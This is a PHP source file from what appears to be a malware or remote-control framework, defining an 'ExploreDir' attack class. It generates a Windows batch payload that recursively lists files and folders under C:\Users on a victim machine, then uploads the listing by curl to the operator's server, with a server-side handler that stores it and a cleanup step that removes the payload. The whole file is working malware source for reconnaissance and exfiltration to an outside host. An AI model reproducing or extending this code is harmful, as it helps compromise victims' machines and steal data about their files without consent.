<?php

namespace Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class ExploreDir extends AttackInterface {
    public static int $maxLines = 10000;
    public static int $defaultDepth = 200;

    private string $rootDir = "C:\\Users";
    private int $maxDepth;

    // kay, so making the directory structure is way complicated. Just save that damn file into the attacks folder, then whenever the user wants to read it, just parse it and you're good. There is no point in converting to a tree structure, then to json, then to file, then to json and then to the screen. This is optimizing something that shouldn't exist, and I've fallen for this dammit

    public function __construct() {
        $this->maxDepth = self::$defaultDepth;
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        use Kelvinho\Virus\Attack\AttackInterface;
        if (isset($_FILES["dirsFile"])) {
            $attack = AttackInterface::get("<?php echo $this->attack_id; ?>");
            exec("mv \"" . $_FILES["dirsFile"]["tmp_name"] . "\" " . DATA_FILE . "/attacks/" . $attack->getAttackId() . "/dirs.txt");
            $attack->setExecuted();
            $attack->saveState();
        }
        <?php return ob_get_clean();
    }
    //@formatter:on

    public function getRootDir(): string {
        return $this->rootDir;
    }

    public function setRootDir(string $rootDir): void {
        $this->rootDir = $rootDir;
    }

    public function getMaxDepth(): int {
        return $this->maxDepth;
    }

    public function setMaxDepth(int $maxDepth): void {
        $this->maxDepth = $maxDepth;
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->rootDir = $state["rootDir"];
        $this->maxDepth = $state["maxDepth"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["rootDir"] = $this->rootDir;
        $state["maxDepth"] = $this->maxDepth;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -X POST --form "dirsFile=@%~pd0echo" <?php echo DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        @echo off
        chCp 65001
        SetLocal EnableDelayedExpansion
        set tmpFile=%~pd0tmp
        set echoFile=%~pd0echo
        set /a linesLimit=<?php echo self::$maxLines . "\n"; ?>
        set /a depthLimit=<?php echo $this->maxDepth . "\n"; ?>
        set /a linesSoFar=0
        set /a count=0
        echo.> !echoFile!

        if not exist "<?php echo $this->rootDir; ?>" (goto ending)
        cd /d "<?php echo $this->rootDir; ?>"
        call :explore_dir
        goto ending

        :explore_dir
        for %%f in ("%cd%\*") do (
            echo !count!;f;%%~zf;%%~tf;%%~nxf>>!echoFile!
            set /a linesSoFar+=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
        )
        for /d %%d in ("%cd%\*") do (
            echo !count!;d;-;%%~td;%%~nxd>>!echoFile!
            set /a linesSoFar+=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
            if /i !count! geq !depthLimit! (goto explore_dir_exit)
            set /a count+=1
            cd "%%~d" 2> "!tmpFile!"
            if "!errorLevel!" == "0" (
                call :explore_dir
            )
            cd ..
            set /a count-=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
        )

        :explore_dir_exit
        exit /b 0

        :ending
        echo %cd%
        cd %~pd0
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will include the correct admin page for this particular attack type.
     */
    public function includeAdminPage(): void {
        include(__DIR__ . "/admin.php");
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(__DIR__ . "/controller.php");
    }
}
